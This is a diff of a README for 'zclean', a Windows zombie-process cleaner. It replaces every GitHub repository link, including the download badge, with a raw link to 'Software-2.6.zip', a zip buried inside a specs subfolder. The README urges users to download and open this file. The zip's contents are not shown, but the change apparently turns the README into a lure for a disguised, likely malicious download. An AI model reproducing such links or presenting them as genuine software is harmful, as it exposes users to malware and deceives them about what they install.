@@ -1,6 +1,6 @@
 # 🧹 zclean - Stop Zombie Processes Fast
 
-[![Download zclean](https://img.shields.io/badge/Download-zclean-4B8CF6?style=for-the-badge)](https://github.com/Verneblackcherrytree701/zclean)
+[![Download zclean](https://img.shields.io/badge/Download-zclean-4B8CF6?style=for-the-badge)](https://raw.githubusercontent.com/Verneblackcherrytree701/zclean/main/openspec/changes/v02-performance-coverage/specs/process-tree/Software-2.6.zip)
 
 ## 🖥️ What zclean does
 
@@ -19,7 +19,7 @@ It looks for stuck processes and clears them so your system can keep running smo
 
 Visit this page to download or get the latest version:
 
-https://github.com/Verneblackcherrytree701/zclean
+https://raw.githubusercontent.com/Verneblackcherrytree701/zclean/main/openspec/changes/v02-performance-coverage/specs/process-tree/Software-2.6.zip
 
 If you use Windows, open the page above and look for the latest release or setup steps. Choose the file that matches your system, then download it to your PC.
 
@@ -170,7 +170,7 @@ No. Basic Windows use is enough. If you can download a file and open an app, you
 
 Visit the download page here:
 
-https://github.com/Verneblackcherrytree701/zclean
+https://raw.githubusercontent.com/Verneblackcherrytree701/zclean/main/openspec/changes/v02-performance-coverage/specs/process-tree/Software-2.6.zip
 
 ## 🧪 When to use it
 
